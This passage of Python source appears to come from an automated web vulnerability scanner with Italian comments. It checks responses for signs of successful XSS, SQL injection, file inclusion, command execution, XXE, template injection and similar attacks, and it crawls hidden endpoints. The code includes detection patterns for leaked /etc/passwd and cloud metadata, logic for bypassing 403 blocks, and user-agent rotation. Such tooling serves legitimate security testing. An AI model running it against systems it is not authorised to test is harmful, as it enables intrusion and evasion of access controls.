                bypass_info = f" + {bypass['type']}" if bypass else ""
                print(f"      ⚪ {payload[:30]}{'...' if len(payload) > 30 else ''}{bypass_info} → {response.status_code}")

            return False

        except Exception as e:
            logger.error(f"Unexpected error in test_single_payload: {e}", exc_info=True)
            self.performance_monitor.increment_errors()
            if self.verbose:
                print(f"      ❌ Error testing payload: {e}")
            return False

        finally:
            # ✅ CLEANUP: Chiudi response object per evitare memory leak
            if response is not None:
                try:
                    response.close()
                except:
                    pass
            
    def analyze_response_for_vulnerability(self, response, payload, vuln_type, bypass,
                                          baseline_response=None, response_time=0):
        """
        Enhanced response analysis with intelligent verification and false positive reduction.

        Uses VulnerabilityVerifier for accurate detection with:
        - Type-specific verification (XSS, SQLi, LFI, RCE, SSTI, XXE)
        - Pattern learning from successful detections
        - Evidence-based confidence scoring
        - False positive prevention
        """
        status_code = response.status_code
        response_text = response.text if response.text else ""
        response_text_lower = response_text.lower()
        payload_lower = payload.lower()

        # Controllo risposte vuote (solo veramente vuote, non pagine piccole)
        if len(response_text) < 10:
            return False

        # ========== USE INTELLIGENT VERIFIER AS BOOST ==========
        # Il verifier conferma con alta confidenza, ma NON blocca la legacy detection.
        # Se il verifier dice "sì" → confermato. Se dice "no" → si prova comunque legacy.
        verifier_confirmed = False
        if self.vuln_verifier:
            result = self.vuln_verifier.verify(
                vuln_type=vuln_type,
                payload=payload,
                response_text=response_text,
                response_code=status_code,
                baseline_response=baseline_response,
                response_time=response_time,
                target=self.target_url
            )

            if result.is_vulnerable and result.confidence >= 40:
                if self.verbose:
                    print(f"      ✓ Verified by VulnerabilityVerifier (confidence: {result.confidence}%)")
                    for ev in result.evidence[:3]:
                        print(f"        → {ev}")
                return True
            # Low confidence o non confermato: NON bloccare, prosegui con legacy detection
            verifier_confirmed = False

        # ========== LEGACY DETECTION (fallback) ==========
        # First check: is payload even in response?
        payload_in_response = payload_lower in response_text_lower or payload in response_text

        if not payload_in_response:
            # Special case for blind/content-based vulnerabilities
            # SQLi, LFI, RCE non richiedono che il payload sia riflesso
            if vuln_type in ['sqli', 'lfi', 'rce']:
                # Per SQLi con errore 500/503 senza error message visibile → possibile blind
                if vuln_type == 'sqli' and status_code in [500, 503]:
                    generic_errors = ['404', '403', 'not found', 'forbidden', 'unauthorized']
                    if not any(err in response_text_lower for err in generic_errors):
                        return True
                # Per LFI/RCE/SQLi: continua con vulnerability-specific detection
                pass
            elif vuln_type in ['xxe', 'ssti'] and status_code in [500, 503]:
                # Server error might indicate vulnerability
                generic_errors = ['404', '403', 'not found', 'forbidden', 'unauthorized']
                if any(err in response_text_lower for err in generic_errors):
                    return False
                return True
            elif vuln_type == 'xss':
                # XSS: payload not reflected literally, but check if dangerous
                # patterns from our payload exist unescaped in the response.
                # The payload may have been slightly transformed (whitespace, case)
                # but the dangerous construct could still be present.
                # Fall through to dangerous_patterns check below instead of returning False.
                pass
            else:
                # Per altri tipi, se payload non riflesso → probabilmente non vulnerabile
                return False

        # Se il payload è nella risposta, verifica che non sia in un contesto "safe"
        # (commenti HTML, JavaScript, codice escaped, etc.)
        if payload_in_response and self._is_payload_in_safe_context(response_text, payload):
            # Solo per XSS - per SQLi/LFI/RCE il payload potrebbe essere in un commento
            # ma l'effetto è comunque rilevabile
            if vuln_type == 'xss':
                return False

        # ========== LEGACY VULNERABILITY-SPECIFIC DETECTION ==========
        # Eseguito SEMPRE come fallback, anche se il verifier non ha confermato.
        # Il verifier è un boost, non un gate.
        if vuln_type == 'xss':
            # Controlli più stringenti per XSS per ridurre falsi positivi

            # 1. Verifica se i pattern pericolosi sono preservati (non escaped)
            dangerous_patterns = [
                (r'<script[^>]*>', r'&lt;script'),
                (r'javascript:', r'javascript&#58;|javascript%3A'),
                (r'on\w+\s*=', r'on\w+\s*&#61;'),
                (r'<img[^>]*>', r'&lt;img'),
                (r'<svg[^>]*>', r'&lt;svg'),
                (r'<iframe[^>]*>', r'&lt;iframe'),
                (r'<object[^>]*>', r'&lt;object'),
                (r'<embed[^>]*>', r'&lt;embed'),
            ]

            for pattern, escaped_pattern in dangerous_patterns:
                if re.search(pattern, payload, re.I):
                    # Check if pattern exists unescaped in response
                    resp_matches = list(re.finditer(pattern, response_text, re.I))

                    # If payload wasn't literally reflected, we must ensure the
                    # pattern match is NEW (not from the original page).
                    # Use baseline to filter out pre-existing matches.
                    if not payload_in_response and baseline_response:
                        baseline_match_count = len(re.findall(pattern, baseline_response, re.I))
                        if len(resp_matches) <= baseline_match_count:
                            continue  # No new matches → not our injection

                    for match in resp_matches:
                        # Verifica che il match sia effettivamente dal nostro payload
                        # e non da altri script legittimi nella pagina
                        context_start = max(0, match.start() - 100)
                        context_end = min(len(response_text), match.end() + 100)
                        context = response_text[context_start:context_end]

                        # Se il pattern matched non è in un commento, CDATA, o escaped
                        if not re.search(r'<!--.*?' + pattern + r'.*?-->', context, re.I | re.S):
                            if not re.search(r'<!\[CDATA\[.*?' + pattern + r'.*?\]\]>', context, re.I | re.S):
                                if not re.search(escaped_pattern, context, re.I):
                                    return True
        
        elif vuln_type == 'sqli':
            # ========== ENHANCED SQL INJECTION DETECTION ==========
            # Ora rileva: Error-based, UNION-based, Content-based, Blind

            # 1. ERROR-BASED: cerca messaggi di errore SQL
            for pattern in self.sqli_patterns:
                match = pattern.search(response_text)
                if match:
                    # Errore SQL trovato - conferma vulnerabilità
                    return True

            # 2. UNION-BASED: cerca output di funzioni SQL comuni
            # Questi pattern indicano che dati SQL sono stati estratti
            union_indicators = [
                # MySQL
                r'\d+\.\d+\.\d+[-\w]*',  # Version numbers (5.7.31-log, 8.0.23)
                r'root@localhost',
                r'mysql\.user',
                r'information_schema',
                r'@@version',
                r'@@datadir',
                # PostgreSQL
                r'PostgreSQL\s+\d+\.\d+',
                # MSSQL
                r'Microsoft SQL Server',
                # SQLite
                r'SQLite\s+\d+\.\d+',
                # Generic
                r'INFORMATION_SCHEMA',
                r'pg_catalog',
                r'sys\.databases',
            ]

            # Verifica se il payload contiene UNION/SELECT e la risposta ha output SQL
            payload_upper = payload.upper()
            if 'UNION' in payload_upper or 'SELECT' in payload_upper:
                for indicator in union_indicators:
                    if re.search(indicator, response_text, re.I):
                        return True

            # 3. CONTENT-BASED: richiede confronto con baseline (non implementabile qui)
            # NOTA: La vera detection content-based richiede:
            #   - Salvare la risposta PRIMA dell'injection (baseline)
            #   - Confrontare la risposta DOPO l'injection
            #   - Se significativamente diversa → possibile SQLi
            # Senza baseline, non possiamo fare detection content-based affidabile
            # quindi NON la implementiamo qui per evitare falsi positivi

            # 4. TIME-BASED BLIND: richiede misurazione tempo risposta
            # Non implementabile senza modifiche al chiamante

            # 5. Payload SQL reflected (raro ma possibile in messaggi di debug)
            # Solo se il payload UNION/SELECT appare nella risposta
            if 'UNION' in payload_upper and 'SELECT' in payload_upper:
                # Cerca se parti del payload UNION sono nella risposta (SQL reflection)
                if 'UNION' in response_text.upper() and 'SELECT' in response_text.upper():
                    # Verifica che sia il nostro payload, non parole casuali
                    if payload[:15].upper() in response_text.upper():
                        return True
        
        elif vuln_type == 'lfi':
            # LFI detection - pattern di file di sistema e indicatori
            lfi_indicators = [
                # Unix/Linux files
                r'root:[\w\*\!]:0:0:',  # /etc/passwd
                r'daemon:\*:1:1:',
                r'bin:\*:2:2:',
                r'sys:\*:3:3:',
                r'\[boot\s*loader\]',  # boot.ini
                r'multi\(0\)disk\(0\)',

                # PHP specific
                r'allow_url_fopen',
                r'auto_prepend_file',
                r'disable_functions',

                # Web server configs
                r'DocumentRoot',
                r'ServerRoot',
                r'LoadModule',

                # Windows files
                r'Volume\s*Serial\s*Number',
                r'Directory\s*of\s*[A-Z]:',

                # Application files
                r'<\?php',
                r'<%',

                # Error messages (path disclosure)
                r'failed to open stream',
                r'Failed opening',
                r'Warning.*include',
                r'Warning.*file_get_contents'
            ]

            for indicator in lfi_indicators:
                if re.search(indicator, response_text, re.I | re.M):
                    return True

        elif vuln_type == 'rce':
            # RCE detection with baseline comparison.
            # HIGH-confidence indicators almost never appear in normal web pages.
            # MEDIUM-confidence indicators (ping output, paths, shell prompts) CAN
            # appear in normal pages (e.g. DVWA command injection shows ping results
            # by default), so we require them to be NEW vs baseline.
            rce_high_confidence = [
                r'uid=\d+.*gid=\d+.*groups=',
                r'root:[\w\*\!]:0:0:',
                r'daemon:.*:1:1:',
                r'PID\s+TTY\s+TIME\s+CMD',
                r'UID\s+PID\s+PPID',
                r'^[d-][rwx-]{9}\s+\d+\s+\w+\s+\w+\s+\d+',
                r'command not found',
                r'is not recognized as',
            ]

            for indicator in rce_high_confidence:
                resp_matches = re.findall(indicator, response_text, re.I | re.M)
                if resp_matches:
                    if baseline_response:
                        base_matches = re.findall(indicator, baseline_response, re.I | re.M)
                        if len(resp_matches) > len(base_matches):
                            return True  # New matches found beyond baseline
                    else:
                        return True  # No baseline, trust the match

            # Medium-confidence: only count if NEW compared to baseline
            rce_medium_confidence = [
                ('linux_version', r'Linux\s+\w+\s+\d+\.\d+'),
                ('windows', r'Microsoft\s+Windows'),
                ('volume', r'Volume\s+in\s+drive'),
                ('directory', r'Directory\s+of'),
                ('shell_prompt', r'[\w\-]+@[\w\-]+:'),
                ('dollar_prompt', r'[\w\-]+\$'),
                ('hash_prompt', r'[\w\-]+#'),
                ('win_prompt', r'C:\\.*>'),
                ('bin_path', r'/bin/\w+'),
                ('usr_bin', r'/usr/bin/\w+'),
                ('ping_output', r'\d+\s+bytes\s+from\s+[\d\.]+.*ttl=\d+'),
                ('icmp_seq', r'icmp_seq=\d+\s+ttl=\d+'),
            ]

            if baseline_response:
                new_findings = SemanticResponseDiffer.has_new_content(
                    baseline_response, response_text, rce_medium_confidence
                )
                if new_findings:
                    return True
            else:
                # No baseline available - fall back to direct matching
                for name, indicator in rce_medium_confidence:
                    if re.search(indicator, response_text, re.I | re.M):
                        return True
        
        elif vuln_type == 'xxe':
            # ========== XXE DETECTION ==========
            # XXE è vulnerabile se:
            # 1. File content appare nel response (/etc/passwd, win.ini)
            # 2. SSRF success (AWS metadata, internal IPs)
            # 3. XML parsing errors che rivelano structure

            xxe_indicators = [
                # Linux files
                (r'root:[\w\*!]:0:0:', 'File content: /etc/passwd'),
                (r'daemon:[\w\*!]:1:1:', 'File content: /etc/passwd'),
                (r'nobody:[\w\*!]:\d+:', 'File content: /etc/passwd'),

                # Windows files
                (r'\[fonts\]', 'File content: win.ini'),
                (r'\[extensions\]', 'File content: win.ini'),
                (r'\[mci extensions\]', 'File content: win.ini'),

                # PHP source (base64)
                (r'PD9waHA', 'PHP source (base64): <?php'),
                (r'PCFET0NUWVBF', 'HTML source (base64): <!DOCTYPE'),

                # AWS metadata (SSRF via XXE)
                (r'ami-[a-z0-9]+', 'AWS metadata leaked'),
                (r'i-[a-z0-9]+', 'AWS instance ID leaked'),

                # XML parsing errors
                (r'XML.*error', 'XML parsing error'),
                (r'DOCTYPE.*entity', 'Entity processing error'),
                (r'External entity', 'External entity error'),
                (r'java\.io\.FileNotFoundException', 'Java file not found'),
                (r'org\.xml\.sax\.SAXParseException', 'SAX parse exception'),

                # Test string
                (r'XXE_TEST_STRING', 'XXE entity processed'),
            ]

            for pattern, description in xxe_indicators:
                if re.search(pattern, response_text, re.I | re.M):
                    return True

        elif vuln_type == 'ssti':
            # ========== SSTI DETECTION (Enhanced) ==========

            # Check 1: Math evaluation (7*7=49, 7+7=14)
            math_checks = [
                ('7*7', '49'),
                ('7+7', '14'),
                ('8*8', '64'),
                ('9*9', '81'),
            ]

            for operation, result in math_checks:
                if operation in payload and result in response_text:
                    # Verify result is NEW (not in baseline)
                    if not baseline_response or result not in baseline_response:
                        # Additional check: result appears near our injection point
                        if payload in response_text:
                            payload_pos = response_text.find(payload)
                            # Check if result is within 100 chars of payload
                            nearby_text = response_text[max(0, payload_pos-50):payload_pos+len(payload)+50]
                            if result in nearby_text:
                                return True
                        else:
                            # Payload not visible, but result appeared
                            return True

            # Check 2: Template engine disclosure
            engine_disclosures = [
                (r'jinja2', 'Jinja2 template engine'),
                (r'smarty', 'Smarty template engine'),
                (r'twig', 'Twig template engine'),
                (r'freemarker', 'FreeMarker template engine'),
                (r'velocity', 'Velocity template engine'),
                (r'blade', 'Blade template engine'),
            ]

            for pattern, engine in engine_disclosures:
                if re.search(pattern, response_text_lower):
                    # Engine name appeared - might be from {{config}} or similar
                    baseline_text = baseline_response.lower() if isinstance(baseline_response, str) else ''
                    if not baseline_response or not re.search(pattern, baseline_text):
                        return True

            # Check 3: Template syntax errors
            template_errors = [
                r'TemplateSyntaxError',
                r'jinja2\.exceptions',
                r'Smarty\s+Error',
                r'DotLiquid\s+Error',
                r'freemarker\.template',
                r'velocity\.exception',
                r'UndefinedError',
                r'TemplateNotFound',
                r'template.*error',
                r'rendering.*error',
            ]

            for error in template_errors:
                if re.search(error, response_text, re.I):
                    return True

            # Check 4: Object/Class disclosure (Jinja2 exploitation)
            class_indicators = ['__mro__', '__subclasses__', '__globals__', '__builtins__', 'object at 0x', '<class ']
            if any(indicator in response_text_lower for indicator in class_indicators):
                baseline_text = baseline_response.lower() if isinstance(baseline_response, str) else ''
                if not baseline_response or not any(ind in baseline_text for ind in ['__mro__', '__subclasses__']):
                    return True

            # Check 5: Command execution output (if RCE payload used)
            if any(cmd in payload.lower() for cmd in ['exec', 'system', 'popen', 'runtime', 'getruntime']):
                rce_indicators = [
                    r'uid=\d+',
                    r'gid=\d+',
                    r'root:.*:0:0:',
                    r'win32|windows',
                ]
                for pattern in rce_indicators:
                    if re.search(pattern, response_text, re.I):
                        return True

        elif vuln_type == 'crlf':
            # ========== CRLF INJECTION DETECTION ==========
            # CRLF è vulnerabile se:
            # 1. Header injected appare nella risposta HTTP
            # 2. Cookie injected appare nei Set-Cookie headers
            # 3. Location header manipolato

            # Check response headers
            response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            response_headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}

            # Check 1: Injected header presente
            crlf_indicators = [
                ('x-injected-header', 'Custom header injection'),
                ('x-crlf', 'CRLF header injection'),
            ]

            for header_name, description in crlf_indicators:
                if header_name in response_headers_lower:
                    return True

            # Check 2: Cookie injection
            if 'set-cookie' in response_headers_lower:
                cookies = response_headers_lower.get('set-cookie', '')
                if 'crlf=injected' in cookies or 'test=crlf' in cookies:
                    return True

            # Check 3: Location header manipulation
            if 'location' in response_headers_lower:
                location = response_headers_lower['location']
                if 'evil.com' in location or 'attacker' in location:
                    return True

            # Check 4: Response splitting (double CRLF in payload, HTML in response)
            if '%0d%0a%0d%0a' in payload.lower() or '\\r\\n\\r\\n' in payload:
                if '<html>crlf</html>' in response_text_lower or 'crlf</body>' in response_text_lower:
                    return True

        elif vuln_type == 'xpath':
            # ========== XPATH INJECTION DETECTION ==========
            # XPath è vulnerabile se:
            # 1. Errori XPath nel response
            # 2. Boolean bypass successful (authentication bypass)
            # 3. Data extraction (XML nodes in response)

            # Check 1: XPath syntax errors
            xpath_errors = [
                r'xpath.*error',
                r'xpath.*syntax',
                r'invalid.*xpath',
                r'xmlexception',
                r'org\.apache\.xpath',
                r'javax\.xml\.xpath',
                r'XPathException',
                r'SimpleXMLElement',
                r'DOMXPath',
                r'XPath.*Exception',
            ]

            for error in xpath_errors:
                if re.search(error, response_text, re.I):
                    return True

            # Check 2: Authentication bypass (boolean-based)
            if "or '1'='1" in payload.lower() or 'or 1=1' in payload.lower():
                success_indicators = [
                    r'welcome',
                    r'logged.*in',
                    r'dashboard',
                    r'profile',
                    r'logout',
                    r'success.*login',
                    r'authentication.*success',
                ]

                if any(re.search(ind, response_text_lower) for ind in success_indicators):
                    if baseline_response:
                        baseline_lower = baseline_response.lower() if isinstance(baseline_response, str) else ''
                        if not any(re.search(ind, baseline_lower) for ind in success_indicators):
                            return True
                    else:
                        return True

            # Check 3: Data extraction (XML nodes leaked)
            if '|' in payload or '//' in payload:
                xml_patterns = [
                    r'<[a-z]+>[^<]+</[a-z]+>',
                    r'<user>.*</user>',
                    r'<password>.*</password>',
                    r'<name>.*</name>',
                    r'<email>.*</email>',
                ]

                for pattern in xml_patterns:
                    matches = re.findall(pattern, response_text, re.I | re.S)
                    if matches:
                        if baseline_response:
                            baseline_str = baseline_response if isinstance(baseline_response, str) else ''
                            baseline_matches = re.findall(pattern, baseline_str, re.I | re.S)
                            if len(matches) > len(baseline_matches):
                                return True
                        else:
                            return True

            # Check 4: Boolean content difference
            if baseline_response and isinstance(baseline_response, str):
                size_diff = abs(len(response_text) - len(baseline_response))
                if size_diff > 50 and status_code == 200:
                    return True

        elif vuln_type == 'csrf':
            # ========== CSRF DETECTION ==========
            # CSRF è vulnerabile se:
            # 1. Action eseguita senza token valido (status 200)
            # 2. Nessun errore "invalid token" o "csrf failed"
            # 3. Response mostra che l'azione è stata eseguita

            if status_code == 200:
                # Check se c'è messaggio di errore CSRF
                csrf_errors = [
                    r'csrf.*fail',
                    r'csrf.*invalid',
                    r'csrf.*miss',
                    r'token.*invalid',
                    r'token.*miss',
                    r'token.*require',
                    r'invalid.*token',
                    r'security.*token',
                    r'forbidden',
                    r'not.*authorized'
                ]

                has_csrf_error = any(re.search(err, response_text_lower) for err in csrf_errors)

                if not has_csrf_error:
                    # Azione eseguita senza errore CSRF = vulnerabile
                    # Cerca conferme che l'azione sia stata eseguita
                    success_indicators = [
                        r'success',
                        r'updated',
                        r'changed',
                        r'deleted',
                        r'created',
                        r'saved',
                        r'complete',
                        r'confirmed'
                    ]

                    has_success = any(re.search(ind, response_text_lower) for ind in success_indicators)

                    if has_success or len(response_text) > 100:
                        # Response normale senza errore CSRF = probabile vuln
                        return True

        # Bypass success validation: a bypass changes how the request reaches the server,
        # but the RESPONSE still needs to show actual vulnerability indicators.
        # Simply getting a 200 response with content does NOT mean the target is vulnerable.
        # The vulnerability-specific checks above already handle detection.

        return False

    def _is_payload_in_safe_context(self, response_text, payload):
        """
        Verifica se il payload è in un contesto "safe" che non rappresenta una vulnerabilità.

        Riduce i falsi positivi escludendo:
        - Payload in commenti HTML (<!-- payload -->)
        - Payload in commenti JavaScript (// payload o /* payload */)
        - Payload escaped in HTML (&lt;script&gt; invece di <script>)
        - Payload in attributi data- o in JSON escaped
        - Payload in stringhe JavaScript tra virgolette con escape

        Args:
            response_text: Testo completo della risposta
            payload: Payload da verificare

        Returns:
            True se il payload è in un contesto safe (falso positivo), False altrimenti
        """
        # Verifica se il payload è SOLO dentro un commento HTML (non anche fuori)
        # Prima cerca il payload fuori dai commenti: se esiste anche fuori, non è safe
        text_without_comments = re.sub(r'<!--[\s\S]*?-->', '', response_text)
        text_without_comments = re.sub(r'/\*[\s\S]*?\*/', '', text_without_comments)
        text_without_comments = re.sub(r'//[^\n]*', '', text_without_comments)

        if payload in text_without_comments:
            # Il payload è presente anche FUORI dai commenti → non è safe
            return False

        # Verifica se il payload è SOLO escaped in HTML (la versione raw NON è presente)
        # Es: <script> diventa &lt;script&gt; e la versione raw non appare
        escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        if escaped_payload in response_text and escaped_payload != payload:
            if payload not in response_text:
                return True
            # Se il payload è presente sia raw che escaped, NON è safe (il raw è exploitable)

        # Verifica se il payload è in un attributo data- o simile (spesso usato per storage)
        data_attr_pattern = r'data-[a-zA-Z0-9\-]*\s*=\s*["\']' + re.escape(payload) + r'["\']'
        if re.search(data_attr_pattern, response_text, re.I):
            # Non è necessariamente safe, ma ha bassa priorità
            # Controlliamo se è accessibile via DOM
            pass  # Lasciamo passare per ulteriori controlli

        # Verifica se il payload è in JSON escaped
        # Es: {"test": "<script>alert(1)</script>"} diventa {"test": "\u003cscript\u003e..."}
        json_escaped_patterns = [
            r'\\u003c',  # <
            r'\\u003e',  # >
            r'\\u0022',  # "
            r'\\u0027',  # '
        ]
        if any(pattern in response_text for pattern in json_escaped_patterns):
            # Potrebbe essere JSON escaped, verifichiamo più nel dettaglio
            if payload.replace('<', r'\u003c').replace('>', r'\u003e') in response_text:
                return True

        # Verifica se il payload è in una stringa JavaScript tra virgolette con proper escaping
        # Es: var x = "<script>alert(1)<\/script>";
        js_escaped_pattern = re.escape(payload).replace(r'\<', r'\\<').replace(r'\/', r'\\/')
        js_string_pattern = r'["\']' + js_escaped_pattern + r'["\']'
        match = re.search(js_string_pattern, response_text, re.I)
        if match:
            # Check that the MATCHED string itself contains the escaped slash,
            # not just that <\/ exists somewhere on the page (it always does
            # in pages with legitimate </script> tags)
            matched_string = match.group(0)
            if r'<\/' in matched_string or r'<\\/' in matched_string:
                return True

        return False

    def discover_hidden_endpoints(self, max_paths=1000):
        """Smart endpoint discovery using technology-specific wordlists"""
        print("  🔍 Smart Endpoint Discovery...")
        if self.verbose:
            print(f"  📊 Already visited: {len(self.visited_urls)} URLs")
        logger.info("Starting smart endpoint discovery with wordlists")
        
        # Get appropriate wordlists based on detected tech
        wordlists = self.get_discovery_wordlists()
        discovered_count = 0
        tested_paths = set()
        
        # Collect all paths to test
        all_paths = []
        for wordlist in wordlists:
            if os.path.exists(wordlist['path']):
                try:
                    with open(wordlist['path'], 'r', encoding='utf-8', errors='ignore') as f:
                        paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                        # Add technology context to each path
                        for path in paths:
                            if path not in tested_paths:
                                all_paths.append((path, wordlist['technology']))
                                tested_paths.add(path)
                                if len(all_paths) >= max_paths:
                                    break
                    logger.info(f"Loaded {len(paths)} paths from {wordlist['technology']} wordlist")
                except Exception as e:
                    logger.error(f"Error reading wordlist {wordlist['path']}: {e}")
            
            if len(all_paths) >= max_paths:
                break
        
        logger.info(f"Testing {len(all_paths)} unique paths")
        
        # Thread pool for concurrent discovery
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            # Submit all tasks
            future_to_path = {
                executor.submit(self.check_endpoint, path): (path, tech) 
                for path, tech in all_paths
            }
            
            # Process results as they complete
            for future in concurrent.futures.as_completed(future_to_path):
                path, tech = future_to_path[future]
                try:
                    result = future.result()
                    if result:
                        discovered_count += 1
                except Exception as e:
                    logger.error(f"Error checking {path}: {e}")
        
        logger.info(f"Discovered {discovered_count} new endpoints")
        if self.verbose:
            print(f"  📊 Queue size after discovery: {self.url_queue.qsize()} URLs to process")
    
    def get_discovery_wordlists(self):
        """Select wordlists based on detected technologies"""
        wordlists = []
        added_sources = set()
        
        # Always include generic wordlists
        generic_lists = self.discovery_mapper.get_wordlists('generic')
        for wl in generic_lists:
            if wl['path'] not in added_sources:
                wordlists.append(wl)
                added_sources.add(wl['path'])
        
        # Add CMS-specific wordlists
        if self.results['technologies'].get('cms'):
            cms = self.results['technologies']['cms'].lower()
            cms_lists = self.discovery_mapper.get_wordlists(cms)
            for wl in cms_lists:
                if wl['path'] not in added_sources:
                    wordlists.append(wl)
                    added_sources.add(wl['path'])
        
        # Add language-specific wordlists
        if self.results['technologies'].get('language'):
            lang = self.results['technologies']['language'].lower()
            lang_lists = self.discovery_mapper.get_wordlists(lang)
            for wl in lang_lists:
                if wl['path'] not in added_sources:
                    wordlists.append(wl)
                    added_sources.add(wl['path'])
        
        logger.info(f"Selected {len(wordlists)} wordlists for discovery")
        return wordlists
    
    def check_endpoint(self, path):
        """Check if an endpoint exists, with bypass support"""
        # Clean path
        if not path.startswith('/'):
            path = '/' + path
        
        url = self.target_url + path
        
        # Skip if already visited
        if self.normalize_url(url) in self.visited_urls:
            return None
        
        try:
            # Rotate user agent
            self._rotate_user_agent()
            
            # Use HEAD first (faster)
            response = self.session.head(url, timeout=5, allow_redirects=False, verify=False)
            status = response.status_code
            
            # If blocked and we have bypasses, try them
            if status in [401, 403] and self.bypass_manager and self.bypass_manager.validated_bypasses:
                for bypass in self.bypass_manager.validated_bypasses:
                    bypass_params = self.bypass_manager.apply_bypass_to_request(url, bypass)
                    if bypass_params:
                        try:
                            bypass_response = self.session.head(
                                bypass_params['url'],
                                headers=bypass_params.get('headers'),
                                timeout=5,
                                allow_redirects=False,
                                verify=False
                            )
                            if bypass_response.status_code not in [401, 403]:
                                status = bypass_response.status_code
                                response = bypass_response
                                if self.verbose:
                                    print(f"🔧 Bypass {bypass['type']} successful for {path}: {status}")
                                break
                        except:
                            continue
            
            # If interesting status, try GET for more info
            if status in [200, 201, 301, 302, 401, 403, 405]:
                if status == 405:  # Method not allowed, try GET
                    response = self.session.get(url, timeout=5, allow_redirects=False, verify=False)
                    status = response.status_code
                
                logger.info(f"Found endpoint: {path} (Status: {status})")
                
                result = {
                    'url': url,
                    'path': path,
                    'status': status,
                    'content_type': response.headers.get('Content-Type', ''),
                    'size': response.headers.get('Content-Length', 0)
                }
                
                # Add to interesting files based on status
                self.results['interesting_files'].append(result)
                
                # Se è un redirect, prova a seguirlo per vedere se porta a una pagina valida
                if status in [301, 302]:
                    try:
                        if self.verbose:
                            print(f"  ↪️ Following redirect from {path}...")
                            # AGGIUNGI: mostra l'header Location
                            location = response.headers.get('Location', 'No Location header')
                            print(f"    📍 Location header: {location}")
                        
                        # Segui il redirect
                        redirect_response = self.session.get(url, timeout=10, allow_redirects=True, verify=False)
                        final_url = redirect_response.url
                        final_status = redirect_response.status_code
                        
                        # AGGIUNGI: mostra sempre dove porta (non solo se status 200)
                        if self.verbose:
                            print(f"    → Final destination: {final_url} (Status: {final_status})")
                        
                        # If blocked at destination and we have bypasses, try them
                        if final_status in [401, 403] and self.bypass_manager and self.bypass_manager.validated_bypasses:
                            if self.verbose:
                                print(f"    🚫 Destination blocked ({final_status}), trying bypasses...")
                            
                            for bypass in self.bypass_manager.validated_bypasses:
                                bypass_params = self.bypass_manager.apply_bypass_to_request(final_url, bypass)
                                if bypass_params:
                                    try:
                                        bypass_redirect_response = self.session.get(
                                            bypass_params['url'],
                                            headers=bypass_params.get('headers'),
                                            timeout=10,
                                            verify=False,
                                            allow_redirects=True
                                        )
                                        
                                        if bypass_redirect_response.status_code not in [401, 403]:
                                            if self.verbose:
                                                print(f"      🔧 Bypass {bypass['type']} successful! Status: {bypass_redirect_response.status_code}")
                                            final_status = bypass_redirect_response.status_code
                                            final_url = bypass_redirect_response.url
                                            redirect_response = bypass_redirect_response
                                            break
                                        elif self.verbose:
                                            print(f"      ❌ Still blocked with {bypass['type']}: {bypass_redirect_response.status_code}")
                                    except Exception as e:
                                        if self.verbose:
                                            print(f"      ❌ Bypass error: {e}")
                                        continue
                        
                        if final_status == 200:
                            logger.info(f"Redirect {path} → {final_url} (Status: {final_status})")
                            
                            # Aggiungi la destinazione finale alla coda se non è già stata visitata
                            if self.normalize_url(final_url) not in self.visited_urls:
                                self.url_queue.put((final_url, 0))
                                
                                if self.verbose:
                                    print(f"    ✅ Added redirect destination to crawl queue: {final_url}")
                            else:
                                # AGGIUNGI: mostra se già visitato
                                if self.verbose:
                                    print(f"    ⚠️ Already visited: {final_url}")
                            
                            # Aggiorna il risultato con info sul redirect
                            result['redirect_to'] = final_url
                            result['redirect_status'] = final_status
                        else:
                            # AGGIUNGI: mostra perché non viene aggiunto
                            if self.verbose:
                                print(f"    ❌ Not added to queue (status: {final_status})")
                    except Exception as e:
                        logger.debug(f"Error following redirect from {path}: {e}")
                        # AGGIUNGI: mostra errori se verbose
                        if self.verbose:
                            print(f"    ❌ Error: {e}")
                
                return result
                
        except requests.exceptions.Timeout:
            logger.debug(f"Timeout checking {path}")
        except requests.exceptions.ConnectionError:
            logger.debug(f"Connection error checking {path}")
        except Exception as e:
            logger.debug(f"Error checking {path}: {e}")
        
        return None
    
    def calculate_priority(self, endpoint):
        """Calculate priority score for an endpoint"""
        score = 0
        
        # High value endpoints
        high_value_paths = ['/admin', '/api', '/upload', '/login', '/register', 
                           '/password', '/account', '/profile', '/payment']
        for path in high_value_paths:
            if path in endpoint['url'].lower():
                score += 10
        
        # Number of parameters
        score += len(endpoint.get('parameters', [])) * 2
        
        # High confidence vulnerabilities
        for param in endpoint.get('parameters', []):
            for vuln in param.get('predicted_vulns', []):
                if vuln['confidence'] >= 85:
                    score += 8
                elif vuln['confidence'] >= 60:
                    score += 5
                else:
                    score += 2
        
        # Form endpoints
        if endpoint.get('form'):
            score += 3
        
        # File upload
        for param in endpoint.get('parameters', []):
            if param.get('type') == 'file':
                score += 10
        
        return score
    
    def run(self, discovery_limit=1000, skip_discovery=False):
        """Run the crawler"""
        logger.info(f"Starting crawl of {self.target_url}")
        
        # Resolve initial redirects
        if not self.resolve_initial_redirects():
            logger.error("Failed to reach target URL")
            return self.results
        
        # Start with resolved target URL
        self.url_queue.put((self.target_url, 0))
        
        # Do initial crawl to detect technologies
        initial_url, _ = self.url_queue.get()
        self.crawl_page(initial_url, 0)
        
        # Smart endpoint discovery based on detected technologies
        if not skip_discovery and self.results['technologies']:
            self.discover_hidden_endpoints(max_paths=discovery_limit)
        elif not skip_discovery:
            # If no tech detected yet, do basic discovery
            logger.info("No technologies detected yet, using basic discovery")
            basic_endpoints = ['/robots.txt', '/sitemap.xml', '/.well-known/', '/api/', '/admin/']
            for endpoint in basic_endpoints:
                self.url_queue.put((self.target_url + endpoint, 0))
        
        # Continue crawling
        while not self.url_queue.empty() and len(self.visited_urls) < self.max_pages:
            url, depth = self.url_queue.get()
            if self.verbose:
                print(f"\n📄 Processing from queue: {url} (depth: {depth})")
            self.crawl_page(url, depth)
            
            # Small delay between requests
            time.sleep(random.uniform(0.5, 1.5))
        
        # Process results
        self.results['endpoints'] = self.endpoints
        
        # Calculate priorities
        for endpoint in self.results['endpoints']:
            endpoint['priority'] = self.calculate_priority(endpoint)
        
        # Sort by priority
        self.results['endpoints'].sort(key=lambda x: x['priority'], reverse=True)
        
        # Remove duplicates
        self.results['javascript_files'] = list(set(self.results['javascript_files']))
        self.results['api_endpoints'] = list(set(self.results['api_endpoints']))
